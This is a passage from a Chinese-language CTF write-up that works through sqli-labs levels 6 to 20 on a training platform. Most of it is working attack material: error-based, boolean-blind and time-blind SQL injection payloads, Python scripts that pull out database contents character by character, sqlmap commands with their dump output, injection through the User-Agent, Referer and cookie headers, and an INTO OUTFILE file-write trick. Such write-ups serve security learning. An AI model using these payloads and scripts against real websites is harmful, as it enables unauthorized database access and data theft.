href="https://juejin.cn/post/7276696853893627956">https://juejin.cn/post/7276696853893627956</a></p><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>Less-5的单引号闭合改为双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>也可以用extractvalue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database()))%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))%23</span><br></pre></td></tr></table></figure><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>这关用<code>((&#39;  &#39;))</code>包裹变量</p><p>测试:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and sleep(5)%23</span><br></pre></td></tr></table></figure><p>这里很明显可以使用时间注入</p><p>不过测试了一下发现布尔盲注也是可以的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and ascii(substr(database(),1,1))&gt;1%23</span><br></pre></td></tr></table></figure><p>不过应该都是非预期,网上还有另一种方法,正是使用提示中的<code>outfile</code></p><p><strong><strong>文件上传</strong></strong></p><p>需要更改mysql的配置文件,将 secure-file-priv 置为空,即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure-file-priv=</span><br></pre></td></tr></table></figure><p>之后编写payload:</p><p>1’)) union select 1,2,database() into outfile ‘文件要被保存的路径’%23</p><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>探测到闭合方式为单引号,且无回显,但可以利用是否返回<code>You are in...........</code>来实现布尔注入</p><p>编写exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">host = <span class="string">&quot;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select database()&quot;</span></span><br><span class="line"><span class="comment">#sql = &quot;select flag from ctftraining.flag&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        payload = host + <span class="string">&quot;?id=1&#x27; and (ascii(substr(&quot;</span>+ <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> +<span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;)--+&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        res = requests.get(url=payload)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>实际上可以sqlmap一把梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> --dbs</span><br><span class="line"></span><br><span class="line">available databases [6]:</span><br><span class="line">[*] `security`</span><br><span class="line">[*] ctftraining</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> -D ctftraining --tables</span><br><span class="line"></span><br><span class="line">[00:50:30] [INFO] retrieved: 3</span><br><span class="line">[00:50:30] [INFO] retrieved: flag</span><br><span class="line">[00:50:32] [INFO] retrieved: news</span><br><span class="line">[00:50:34] [INFO] retrieved: <span class="built_in">users</span></span><br><span class="line">Database: ctftraining</span><br><span class="line">[3 tables]</span><br><span class="line">+-------+</span><br><span class="line">| flag  |</span><br><span class="line">| news  |</span><br><span class="line">| <span class="built_in">users</span> |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> -D ctftraining -T flag --columns</span><br><span class="line"></span><br><span class="line">[00:52:08] [INFO] retrieved: 1</span><br><span class="line">[00:52:08] [INFO] retrieved: flag</span><br><span class="line">[00:52:10] [INFO] retrieved: char(128)</span><br><span class="line">Database: ctftraining</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+-----------+</span><br><span class="line">| Column | Type      |</span><br><span class="line">+--------+-----------+</span><br><span class="line">| flag   | char(128) |</span><br><span class="line">+--------+-----------+</span><br><span class="line"></span><br><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> -D ctftraining -T flag -C flag --dump</span><br><span class="line"></span><br><span class="line">[00:58:14] [INFO] retrieved: 1</span><br><span class="line">[00:58:15] [INFO] retrieved: flag&#123;fff4e3e8-56b7-4dba-b3e0-6094092c0666&#125;</span><br><span class="line">Database: ctftraining</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| flag                                       |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| flag&#123;fff4e3e8-56b7-4dba-b3e0-6094092c0666&#125; |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line"></span><br><span class="line">tips:这里获取的时候出错了一次,下次dump时会直接返回缓存文件中错误的内容而不是注入,我们可以使用-flush-session参数来刷新缓存</span><br><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> -D ctftraining -T flag -C flag --dump -flush-session</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>探测到单引号闭合,且这次只要有输入都会回显You are in………..</p><p>但是sleep(5)会被执行,所以为时间盲注</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">host = <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-9/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sql = <span class="string">&quot;select flag from ctftraining.flag&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        payload = host + <span class="string">&quot;?id=1&#x27; and if(ascii(substr(&quot;</span>+ <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> +<span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),1)--+&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        time1 = time.time()</span><br><span class="line">        res = requests.get(url=payload)</span><br><span class="line">        <span class="keyword">if</span> time.time() - time1 &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid &lt;=<span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219141744631.png" alt="image-20240219141744631"></p><p>当然也可以使用sqlmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=T -u &#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-9/?id=1&#x27; -D ctftraining -T flag -C flag --dump -flush-session</span><br></pre></td></tr></table></figure><p>同样可以获取flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219142725988.png" alt="image-20240219142725988"></p><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>与Less-9不同之处在于此题使用双引号闭合</p><p>将Less-9的exp中单引号闭合改为双引号即可</p><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>这里其实是可以union注入的</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=-1&amp;Submit=submit&amp;uname=-1&#x27; union select flag,2 from ctftraining.flag--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219144027646.png" alt="image-20240219144027646"></p><p>但题目给出的tag是报错注入,还是尝试一下报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Submit=submit&amp;passwd=-1&amp;uname=-1&#x27; and updatexml(1,concat(0x7e,(select substr(flag,1,30) from ctftraining.flag),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">Submit=submit&amp;passwd=-1&amp;uname=-1&#x27; and updatexml(1,concat(0x7e,(select substr(flag,30,100) from ctftraining.flag),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219144902177.png" alt="image-20240219144902177"></p><p>缺点是报错注入只显示部分字符串,需要substr来截取</p><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>使用<code>&quot;)</code>闭合,其他与Less-11相同</p><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>使用<code>&#39;)</code>闭合,其他与Less-11相同</p><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>使用<code>&quot;</code>闭合也可以直接报错注入</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219170929047.png" alt="image-20240219170929047"></p><p>不知道是不是预期, 题目tag写的并不是双引号闭合</p><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>post登录,万能密码<code>&#39; or 1=1--+</code>测出注入点</p><p>登录成功返回flag.jpg(提示登录成功)</p><p>登录失败返回slap.jpg(提示登录失败)</p><p>这里编写exp的时候出现了一个小插曲</p><p>我在用使用requests模块发包时,同样的数据,在hackbar中回显flag.jpg而用python发包却回显slap.jpg</p><p>百般疑惑之后,用burp抓包并使用comparer模块进行对比</p><p>左为python发包,右图为hackbar发包</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219182436378.png" alt="image-20240219182436378"></p><p>非常的amazing,这里python将<code>+</code>又进行了一次urlencode变成了%2B,但是<code>+</code>本身就是空格经过一次urlencode的结果,我们是想传入空格而不是加号这个字符</p><p>最后的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#代理到bp</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">key_of_true = <span class="string">&#x27;flag.jpg&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://21b39a7b-a1e6-48ac-8fc8-88c3ba78e2bf.node5.buuoj.cn/Less-15/&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select flag from ctftraining.flag&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Submit&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">&quot;a&#x27; or (ascii(substr(&quot;</span> + <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> + <span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;)-- &quot;</span>  <span class="comment">#这里注释符号必须是`-- `而不是`--+`</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        data[<span class="string">&#x27;uname&#x27;</span>] = payload.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> key_of_true <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><p><code>&quot;)</code>闭合</p><p>将less-15的exp中的payload变量改为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&quot;) or (ascii(substr(&#x27;</span> + <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> + <span class="string">&#x27;,&#123;&#125;,1))&gt;&#123;&#125;)-- &#x27;</span></span><br></pre></td></tr></table></figure><p>即可</p><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><p>和之前的查询语句不同,此关为update语句, 所以联合查询什么的就用不了</p><p>后端sql语句大约为:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> passwd <span class="operator">=</span> <span class="string">&#x27;$passwd&#x27;</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span></span><br></pre></td></tr></table></figure><p>需要注意的是,这里的注入点在passwd而不是之前的uname</p><p>因为这里uname似乎加了waf</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=admin&#x27; and updatexml(1,concat(0x7e,(select substr(flag,1,30) from ctftraining.flag),0x7e),1)#&amp;Submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219191011975.png" alt="image-20240219191011975"></p><p>查看一下源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br></pre></td></tr></table></figure><p>确实做了waf</p><h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>此题在UA处存在sql注入</p><p>后端执行的sql语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里直接获取headers中的User-Agent并插入到数据库中</p><p>且输入单引号后会回显报错信息</p><p>可对ua进行报错注入</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span><br></pre></td></tr></table></figure><p>拼接为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>获取flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219194146867.png" alt="image-20240219194146867"></p><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>相同的配方,只不过这次注入点在Referer</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219194408905.png" alt="image-20240219194408905"></p><h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>题目给的tag是Cookie注入,但是这里并没有set-cookie</p><p>查看了一下源码,比较关键的几句:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . <span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>所以我们需要自己设置一个名为uname的cookie</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219201031236.png" alt="image-20240219201031236"></p><p>注意此时POST中不能提交submit数据,源码中的查询语句只有在表单中没设置submit时才会触发</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Less-1&quot;&gt;&lt;a href=&quot;#Less-1&quot; class=&quot;headerlink&quot; title=&quot;Less-1&quot;&gt;&lt;/a&gt;Less-1&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
